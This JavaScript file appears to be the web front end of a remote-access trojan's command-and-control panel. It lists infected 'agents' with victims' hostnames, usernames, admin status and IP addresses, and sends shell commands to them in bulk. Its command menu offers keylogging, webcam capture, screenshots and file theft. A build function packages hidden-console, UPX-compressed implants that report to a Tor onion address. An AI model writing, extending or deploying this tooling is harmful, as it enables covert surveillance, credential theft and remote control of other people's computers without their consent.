let currentSession = null;
let selectedAgents = new Set();

document.addEventListener('DOMContentLoaded', function() {
    // Tab handling
    const tabButtons = document.querySelectorAll('.tab-button');
    tabButtons.forEach(button => {
        button.addEventListener('click', () => {
            const tabName = button.dataset.tab;
            switchTab(tabName);
        });
    });
    
    // Initialize storage
    updateStorage();
});

function switchTab(tabName) {
    // Update buttons
    document.querySelectorAll('.tab-button').forEach(btn => {
        btn.classList.remove('active');
    });
    document.querySelector(`[data-tab="${tabName}"]`).classList.add('active');
    
    // Update panes
    document.querySelectorAll('.tab-pane').forEach(pane => {
        pane.classList.remove('active');
    });
    document.getElementById(`${tabName}-tab`).classList.add('active');
    
    // Refresh content if needed
    if (tabName === 'storage') {
        updateStorage();
    }
}

function updateStorage() {
    // Fetch and update storage contents
    fetch('/api/storage')
        .then(response => response.json())
        .then(data => {
            updateFileList('downloads-list', data.downloads);
            updateFileList('screenshots-list', data.screenshots);
            updateFileList('uploads-list', data.uploads);
        });
}

function updateFileList(elementId, files) {
    const element = document.getElementById(elementId);
    element.innerHTML = files.map(file => `
        <div class="file-item">
            <span>${file.name}</span>
            <div class="file-actions">
                <button onclick="downloadFile('${file.path}')" title="Download">
                    <span class="material-icons">download</span>
                </button>
                <button onclick="deleteFile('${file.path}')" title="Delete">
                    <span class="material-icons">delete</span>
                </button>
            </div>
        </div>
    `).join('');
}

function downloadFile(path) {
    window.open(`/download/${encodeURIComponent(path)}`, '_blank');
}

function deleteFile(path) {
    if (confirm('Are you sure you want to delete this file?')) {
        fetch('/api/delete_file', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ path })
        })
        .then(response => response.json())
        .then(() => updateStorage());
    }
}

function updateTargets() {
    fetch('/api/targets')
        .then(response => response.json())
        .then(targets => {
            const targetsList = document.getElementById('targets-list');
            targetsList.innerHTML = '';
            
            if (targets.length === 0) {
                targetsList.innerHTML = `
                    <div class="no-targets">
                        <span class="material-icons">devices_off</span>
                        <p>No agents connected</p>
                    </div>`;
                return;
            }
            
            targets.forEach(target => {
                const targetElement = document.createElement('div');
                targetElement.className = 'target-item';
                
                const [ip, port] = target.ip.replace(/[()]/g, '').split(',');
                const lastSeen = new Date(target.last_seen);
                const timeAgo = getTimeAgo(lastSeen);
                
                targetElement.innerHTML = `
                    <div class="agent-checkbox">
                        <input type="checkbox" id="agent-${target.id}" 
                            ${selectedAgents.has(target.id) ? 'checked' : ''}>
                    </div>
                    <div class="agent-icon">
                        <span class="material-icons">${getOSIcon(target.os_type)}</span>
                    </div>
                    <div class="agent-info">
                        <div class="agent-details">
                            <div class="agent-header">
                                <div class="status-badge online"></div>
                                <div class="agent-name">${target.alias}</div>
                                <div class="os-type">${target.os_type}</div>
                            </div>
                            <div class="agent-meta">
                                <span>
                                    <span class="material-icons">router</span>
                                    ${ip}:${port}
                                </span>
                                <span>
                                    <span class="material-icons">schedule</span>
                                    ${timeAgo}
                                </span>
                            </div>
                            <div class="agent-system">
                                <span>
                                    <span class="material-icons">computer</span>
                                    ${target.hostname}
                                </span>
                                <span>
                                    <span class="material-icons">person</span>
                                    ${target.username}
                                </span>
                            </div>
                        </div>
                    </div>
                `;
                
                const checkbox = targetElement.querySelector(`#agent-${target.id}`);
                checkbox.addEventListener('change', (e) => {
                    e.stopPropagation();
                    if (e.target.checked) {
                        selectedAgents.add(target.id);
                    } else {
                        selectedAgents.delete(target.id);
                    }
                    updateSelectedCount();
                });
                
                targetsList.appendChild(targetElement);
            });
            
            updateSelectedCount();
        });
}

function updateSelectedCount() {
    const count = selectedAgents.size;
    const countElement = document.querySelector('.selected-count');
    if (countElement) {
        countElement.textContent = `${count} agent${count !== 1 ? 's' : ''} selected`;
    }
}

function sendMultiCommand() {
    if (selectedAgents.size === 0) {
        appendToOutput(`<div class="error-output">No agents selected</div>`);
        return;
    }
    
    const commandInput = document.getElementById('command-input');
    const command = commandInput.value.trim();
    if (!command) return;
    
    // Clear input and add command to output
    commandInput.value = '';
    appendToOutput(`<div class="command-entry">
        <span class="prompt">$</span>
        <span class="command">${escapeHtml(command)} (to ${selectedAgents.size} agents)</span>
    </div>`);
    
    // Show loading state
    setLoading(true);
    
    // Send command to all selected agents
    const promises = Array.from(selectedAgents).map(agentId => 
        fetch('/api/send_command', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                session_id: agentId,
                command: command
            })
        }).then(response => response.json())
    );
    
    Promise.all(promises)
        .then(results => {
            results.forEach((data, index) => {
                const agentId = Array.from(selectedAgents)[index];
                if (data.error) {
                    appendToOutput(`<div class="error-output">Agent ${agentId}: ${escapeHtml(data.error)}</div>`);
                } else {
                    appendToOutput(`<div class="command-output">Agent ${agentId}:\n${formatOutput(data.output)}</div>`);
                }
            });
        })
        .catch(error => {
            appendToOutput(`<div class="error-output">Error: ${escapeHtml(error.message)}</div>`);
        })
        .finally(() => {
            setLoading(false);
            scrollOutputToBottom();
        });
}

function getTimeAgo(date) {
    const seconds = Math.floor((new Date() - date) / 1000);
    
    let interval = seconds / 31536000;
    if (interval > 1) return Math.floor(interval) + ' years ago';
    
    interval = seconds / 2592000;
    if (interval > 1) return Math.floor(interval) + ' months ago';
    
    interval = seconds / 86400;
    if (interval > 1) return Math.floor(interval) + ' days ago';
    
    interval = seconds / 3600;
    if (interval > 1) return Math.floor(interval) + ' hours ago';
    
    interval = seconds / 60;
    if (interval > 1) return Math.floor(interval) + ' minutes ago';
    
    return Math.floor(seconds) + ' seconds ago';
}

function selectSession(sessionId) {
    currentSession = sessionId;
    const commandPanel = document.querySelector('.command-panel');
    const sessionInfo = document.getElementById('current-session');
    
    // Show command panel
    commandPanel.classList.add('active');
    
    // Get target info
    fetch('/api/targets')
        .then(response => response.json())
        .then(targets => {
            const target = targets.find(t => t.id === sessionId);
            if (!target) return;
            
            // Update session info
            sessionInfo.innerHTML = `
                <div class="session-header">
                    <div class="session-title">
                        <span class="material-icons">${getOSIcon(target.os_type)}</span>
                        Session ${target.id} - ${target.alias}
                        <div class="status-badge online"></div>
                    </div>
                    <div class="session-details">
                        <div>
                            <span class="material-icons">computer</span>
                            ${target.hostname} (${target.os_type})
                        </div>
                        <div>
                            <span class="material-icons">person</span>
                            ${target.username} ${target.is_admin ? '(Admin)' : '(User)'}
                        </div>
                        <div>
                            <span class="material-icons">router</span>
                            ${target.ip.replace(/[()]/g, '').split(',')[0]}
                        </div>
                    </div>
                </div>
                <div id="output"></div>
                <div class="command-input">
                    <input type="text" id="command-input" placeholder="Enter command..." autocomplete="off">
                    <button onclick="sendCommand()" class="send-button">
                        <span class="material-icons">send</span>
                    </button>
                </div>
                <div class="command-buttons">
                    <button onclick="showHelp()" class="help-button">
                        <span class="material-icons">help_outline</span>
                        Help
                    </button>
                    <button onclick="clearOutput()" class="clear-button">
                        <span class="material-icons">clear_all</span>
                        Clear
                    </button>
                    <button onclick="terminateSession(${target.id})" class="danger-button">
                        <span class="material-icons">power_settings_new</span>
                        Terminate
                    </button>
                </div>
            `;
            
            // Focus command input
            const commandInput = document.getElementById('command-input');
            commandInput.focus();
            
            // Add command history support
            commandInput.addEventListener('keydown', handleCommandHistory);
            commandInput.addEventListener('keypress', function(e) {
                if (e.key === 'Enter') {
                    sendCommand();
                }
            });
        });
}

function deselectSession() {
    currentSession = null;
    const commandPanel = document.querySelector('.command-panel');
    const sessionInfo = document.getElementById('current-session');
    
    commandPanel.classList.remove('active');
    sessionInfo.innerHTML = `
        <div class="no-session-message">
            <span class="material-icons">terminal_off</span>
            <div>No active session selected</div>
            <div>Click on a session to start commanding</div>
        </div>
    `;
}

function setLoading(isLoading) {
    const sendButton = document.querySelector('.send-button');
    if (isLoading) {
        sendButton.disabled = true;
        sendButton.innerHTML = '<span class="material-icons loading">sync</span>';
    } else {
        sendButton.disabled = false;
        sendButton.innerHTML = '<span class="material-icons">send</span>';
    }
}

function sendCommand() {
    if (selectedAgents.size === 0) {
        appendToOutput(`<div class="error-output">No agents selected</div>`);
        return;
    }
    
    const commandInput = document.getElementById('command-input');
    const command = commandInput.value.trim();
    if (!command) return;
    
    // Clear input and add command to output
    commandInput.value = '';
    appendToOutput(`<div class="command-entry">
        <span class="prompt">$</span>
        <span class="command">${escapeHtml(command)} (to ${selectedAgents.size} agents)</span>
    </div>`);
    
    // Show loading state
    setLoading(true);
    
    // Send command to all selected agents
    const promises = Array.from(selectedAgents).map(agentId => {
        console.log(`Sending command "${command}" to agent ${agentId}`);
        return fetch('/api/send_command', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                session_id: parseInt(agentId),
                command: command
            })
        })
        .then(response => {
            if (!response.ok) {
                throw new Error(`HTTP error! status: ${response.status}`);
            }
            return response.json();
        })
        .then(data => {
            if (data.error) {
                throw new Error(data.error);
            }
            return { agentId, data };
        });
    });
    
    Promise.all(promises)
        .then(results => {
            results.forEach(({ agentId, data }) => {
                console.log(`Response from agent ${agentId}:`, data);
                appendToOutput(`<div class="command-output">
                    <div class="output-header">Agent ${agentId}:</div>
                    ${formatOutput(data.output)}
                </div>`);
            });
        })
        .catch(error => {
            console.error('Command execution error:', error);
            appendToOutput(`<div class="error-output">Error: ${escapeHtml(error.message)}</div>`);
        })
        .finally(() => {
            setLoading(false);
            scrollOutputToBottom();
        });
}

function appendToOutput(html) {
    const output = document.getElementById('output');
    if (output) {
        output.innerHTML += html;
    }
}

function formatOutput(output) {
    if (typeof output !== 'string') {
        output = JSON.stringify(output, null, 2);
    }
    return escapeHtml(output).replace(/\n/g, '<br>');
}

function escapeHtml(unsafe) {
    return unsafe
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#039;");
}

function scrollOutputToBottom() {
    const output = document.getElementById('output');
    if (output) {
        output.scrollTop = output.scrollHeight;
    }
}

function clearOutput() {
    const output = document.getElementById('output');
    if (output) {
        output.innerHTML = '';
    }
}

// Add command history support
let commandHistory = [];
let historyIndex = -1;

function handleCommandHistory(e) {
    const commandInput = document.getElementById('command-input');
    
    if (e.key === 'ArrowUp') {
        e.preventDefault();
        if (historyIndex < commandHistory.length - 1) {
            historyIndex++;
            commandInput.value = commandHistory[historyIndex];
        }
    } else if (e.key === 'ArrowDown') {
        e.preventDefault();
        if (historyIndex > -1) {
            historyIndex--;
            commandInput.value = historyIndex >= 0 ? commandHistory[historyIndex] : '';
        }
    }
}

// Add CSS for command interface
const commandStyle = document.createElement('style');
commandStyle.textContent = `
    .command-output {
        background: var(--card-dark);
        border-radius: 4px;
        padding: 12px;
        margin: 8px 0;
        font-family: 'Roboto Mono', monospace;
        white-space: pre-wrap;
        word-break: break-all;
    }

    .command-entry {
        color: var(--primary-color);
        margin: 8px 0;
        font-family: 'Roboto Mono', monospace;
    }

    .command-entry .prompt {
        color: var(--success-color);
        margin-right: 8px;
    }

    .error-output {
        color: var(--danger-color);
        background: rgba(244, 67, 54, 0.1);
        border-radius: 4px;
        padding: 12px;
        margin: 8px 0;
        font-family: 'Roboto Mono', monospace;
    }

    #output {
        height: 400px;
        overflow-y: auto;
        padding: 12px;
        background: var(--card-dark);
        border-radius: 8px;
        margin-bottom: 12px;
    }

    .loading {
        width: 20px;
        height: 20px;
        border: 2px solid #f3f3f3;
        border-top: 2px solid var(--primary-color);
        border-radius: 50%;
        animation: spin 1s linear infinite;
    }

    @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
    }
`;

document.head.appendChild(commandStyle);

function uploadFile() {
    const fileInput = document.getElementById('file-input');
    const file = fileInput.files[0];
    
    if (!file) {
        alert('Please select a file first');
        return;
    }
    
    const formData = new FormData();
    formData.append('file', file);
    
    fetch('/api/upload', {
        method: 'POST',
        body: formData
    })
    .then(response => response.json())
    .then(data => {
        const output = document.getElementById('output');
        output.textContent += `\n> File Upload: ${data.message}\n`;
        output.scrollTop = output.scrollHeight;
        fileInput.value = '';
    })
    .catch(error => {
        console.error('Error:', error);
        alert('Error uploading file');
    });
}

function showHelp() {
    fetch('/api/send_command', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            session_id: currentSession || 0,
            command: 'help'
        })
    })
    .then(response => response.json())
    .then(data => {
        const output = document.getElementById('output');
        output.innerHTML += `\n<div class="help-text">${formatHelpText(data.result)}</div>\n`;
        output.scrollTop = output.scrollHeight;
    })
    .catch(error => {
        console.error('Error:', error);
        alert('Error getting help');
    });
}

function formatHelpText(text) {
    return text.replace(/^([A-Za-z\s]+):$/gm, '<div class="command-category">$1:</div>')
               .replace(/^\s\s([a-z_]+.*-->.*$)/gm, '<div class="command-item">$1</div>')
               .replace(/\n/g, '<br>');
}

// Update targets list every 7 seconds
const UPDATE_INTERVAL = 7000;

function startTargetUpdates() {
    // Initial update
    updateTargets();
    
    // Set interval for updates
    setInterval(() => {
        updateTargets();
        
        // Show update indicator
        const targetPanel = document.querySelector('.targets-panel h2');
        targetPanel.classList.add('updating');
        
        // Remove indicator after animation
        setTimeout(() => {
            targetPanel.classList.remove('updating');
        }, 1000);
    }, UPDATE_INTERVAL);
}

// Start the update cycle
startTargetUpdates();

// Handle Enter key in command input
document.getElementById('command-input').addEventListener('keypress', function(e) {
    if (e.key === 'Enter') {
        sendCommand();
    }
});

// Add new functions for session management
function renameSession(sessionId) {
    const newAlias = prompt('Enter new alias for session ' + sessionId);
    if (newAlias) {
        fetch('/api/set_alias', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                session_id: sessionId,
                alias: newAlias
            })
        })
        .then(response => response.json())
        .then(() => {
            updateTargets();
        })
        .catch(error => {
            console.error('Error:', error);
            alert('Error renaming session');
        });
    }
}

function terminateSession(sessionId) {
    if (confirm('Are you sure you want to terminate this session?')) {
        sendCommandToSession(sessionId, 'quit')
            .then(() => {
                if (currentSession === sessionId) {
                    deselectSession();
                }
                updateTargets();
            });
    }
}

function sendCommandToSession(sessionId, command) {
    return fetch('/api/send_command', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            session_id: sessionId,
            command: command
        })
    })
    .then(response => response.json());
}

// Initialize map when page loads
document.addEventListener('DOMContentLoaded', initMap);

// Add these event listeners
document.addEventListener('DOMContentLoaded', () => {
    initTheme();
    document.getElementById('theme-toggle').addEventListener('change', toggleTheme);
});

// Add build agent functionality
function buildAgent() {
    const buildStatus = document.querySelector('.build-status');
    const progress = buildStatus.querySelector('.progress');
    const statusText = buildStatus.querySelector('.status-text');
    
    // Get selected language
    const selectedLanguage = document.querySelector('input[name="language"]:checked').value;
    
    // Get selected skills
    const selectedSkills = Array.from(document.querySelectorAll('input[name="skills"]:checked'))
        .map(checkbox => checkbox.value);
    
    const buildData = {
        language: selectedLanguage,
        platform: document.getElementById('platform-select').value,
        onion_address: document.getElementById('onion-address').value,
        port: document.getElementById('port-number').value,
        options: {
            noconsole: document.getElementById('option-noconsole').checked,
            upx: document.getElementById('option-upx').checked
        },
        skills: selectedSkills
    };
    
    // Validate required fields
    if (!buildData.onion_address) {
        alert('Please enter an onion address');
        return;
    }
    
    if (selectedSkills.length === 0) {
        if (!confirm('No capabilities selected. Build minimal agent?')) {
            return;
        }
    }
    
    // Show build status
    buildStatus.style.display = 'block';
    buildStatus.className = 'build-status';
    progress.style.width = '0%';
    statusText.textContent = 'Starting build process...';
    
    fetch('/api/build_agent', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(buildData)
    })
    .then(response => {
        if (!response.ok) throw new Error('Build failed');
        return response.json();
    })
    .then(data => {
        if (data.status === 'building') {
            // Poll build status
            pollBuildStatus(data.build_id);
        } else {
            showBuildComplete(data);
        }
    })
    .catch(error => {
        buildStatus.className = 'build-status error';
        statusText.textContent = `Build failed: ${error.message}`;
    });
}

function pollBuildStatus(buildId) {
    const buildStatus = document.querySelector('.build-status');
    const progress = buildStatus.querySelector('.progress');
    const statusText = buildStatus.querySelector('.status-text');
    
    const poll = () => {
        fetch(`/api/build_status/${buildId}`)
            .then(response => response.json())
            .then(data => {
                progress.style.width = `${data.progress}%`;
                statusText.textContent = data.status;
                
                if (data.state === 'building') {
                    setTimeout(poll, 1000);
                } else if (data.state === 'complete') {
                    showBuildComplete(data);
                } else if (data.state === 'error') {
                    throw new Error(data.error);
                }
            })
            .catch(error => {
                buildStatus.className = 'build-status error';
                statusText.textContent = `Build failed: ${error.message}`;
            });
    };
    
    poll();
}

function showBuildComplete(data) {
    const buildStatus = document.querySelector('.build-status');
    const progress = buildStatus.querySelector('.progress');
    const statusText = buildStatus.querySelector('.status-text');
    
    buildStatus.className = 'build-status success';
    progress.style.width = '100%';
    statusText.innerHTML = `
        Build complete! <br>
        <a href="/download/${data.filename}" class="download-link">
            <span class="material-icons">download</span>
            Download Agent
        </a>
    `;
}

function getOSIcon(osType) {
    const osLower = osType.toLowerCase();
    if (osLower.includes('windows')) return 'computer';
    if (osLower.includes('linux') || osLower.includes('ubuntu') || osLower.includes('kali')) return 'laptop_linux';
    if (osLower.includes('mac') || osLower.includes('macos')) return 'laptop_mac';
    return 'devices';
}

// Add CSS for command panel
const style = document.createElement('style');
style.textContent = `
    .command-panel {
        display: none;
        background: var(--surface-dark);
        border-radius: 8px;
        padding: 20px;
        margin-top: 20px;
    }

    .command-panel.active {
        display: block;
    }

    .session-header {
        margin-bottom: 20px;
        padding-bottom: 20px;
        border-bottom: 1px solid var(--card-dark);
    }

    .session-title {
        display: flex;
        align-items: center;
        gap: 12px;
        font-size: 18px;
        font-weight: 500;
        margin-bottom: 12px;
    }

    .session-details {
        display: grid;
        grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
        gap: 12px;
        font-size: 14px;
        color: var(--text-secondary);
    }

    .session-details div {
        display: flex;
        align-items: center;
        gap: 8px;
    }

    .danger-button {
        background: var(--danger-color);
    }

    .danger-button:hover {
        background: #d32f2f;
    }
`;

document.head.appendChild(style);

// Add command suggestions and auto-completion
const commonCommands = [
    { cmd: 'help', desc: 'Show available commands' },
    { cmd: 'sysinfo', desc: 'Get system information' },
    { cmd: 'screenshot', desc: 'Take screenshot' },
    { cmd: 'webcam', desc: 'Capture webcam image' },
    { cmd: 'keylog_start', desc: 'Start keylogger' },
    { cmd: 'keylog_dump', desc: 'View keylogger data' },
    { cmd: 'keylog_stop', desc: 'Stop keylogger' },
    { cmd: 'download', desc: 'Download file from target' },
    { cmd: 'upload', desc: 'Upload file to target' },
    { cmd: 'cd', desc: 'Change directory' },
    { cmd: 'pwd', desc: 'Print working directory' },
    { cmd: 'quit', desc: 'Terminate session' }
];

function setupCommandInput(inputElement) {
    const suggestionsBox = document.createElement('div');
    suggestionsBox.className = 'command-suggestions';
    inputElement.parentNode.appendChild(suggestionsBox);
    
    let currentSuggestionIndex = -1;
    
    inputElement.addEventListener('input', (e) => {
        const input = e.target.value.toLowerCase();
        if (!input) {
            suggestionsBox.style.display = 'none';
            return;
        }
        
        const suggestions = commonCommands.filter(cmd => 
            cmd.cmd.toLowerCase().startsWith(input)
        );
        
        if (suggestions.length > 0) {
            suggestionsBox.innerHTML = suggestions.map((cmd, index) => `
                <div class="suggestion-item ${index === currentSuggestionIndex ? 'selected' : ''}" 
                     data-command="${cmd.cmd}">
                    <span class="suggestion-cmd">${cmd.cmd}</span>
                    <span class="suggestion-desc">${cmd.desc}</span>
                </div>
            `).join('');
            suggestionsBox.style.display = 'block';
            
            // Add click handlers
            suggestionsBox.querySelectorAll('.suggestion-item').forEach(item => {
                item.addEventListener('click', () => {
                    inputElement.value = item.dataset.command + ' ';
                    inputElement.focus();
                    suggestionsBox.style.display = 'none';
                });
            });
        } else {
            suggestionsBox.style.display = 'none';
        }
    });
    
    // Handle keyboard navigation
    inputElement.addEventListener('keydown', (e) => {
        const suggestions = suggestionsBox.querySelectorAll('.suggestion-item');
        if (!suggestions.length) return;
        
        if (e.key === 'ArrowDown') {
            e.preventDefault();
            currentSuggestionIndex = Math.min(currentSuggestionIndex + 1, suggestions.length - 1);
            updateSuggestionSelection(suggestions);
        } else if (e.key === 'ArrowUp') {
            e.preventDefault();
            currentSuggestionIndex = Math.max(currentSuggestionIndex - 1, 0);
            updateSuggestionSelection(suggestions);
        } else if (e.key === 'Tab') {
            e.preventDefault();
            if (currentSuggestionIndex >= 0) {
                inputElement.value = suggestions[currentSuggestionIndex].dataset.command + ' ';
            } else if (suggestions.length > 0) {
                inputElement.value = suggestions[0].dataset.command + ' ';
            }
            suggestionsBox.style.display = 'none';
        } else if (e.key === 'Escape') {
            suggestionsBox.style.display = 'none';
            currentSuggestionIndex = -1;
        }
    });
    
    // Hide suggestions when clicking outside
    document.addEventListener('click', (e) => {
        if (!e.target.closest('.command-input')) {
            suggestionsBox.style.display = 'none';
            currentSuggestionIndex = -1;
        }
    });
}

function updateSuggestionSelection(suggestions) {
    suggestions.forEach((item, index) => {
        item.classList.toggle('selected', index === currentSuggestionIndex);
    });
}

function highlightCommand(cmd) {
    const parts = cmd.split(' ');
    const command = parts[0];
    const args = parts.slice(1).join(' ');
    
    if (commonCommands.some(c => c.cmd === command)) {
        return `<span class="cmd-name">${command}</span>${args ? ' ' + args : ''}`;
    }
    return cmd;
} 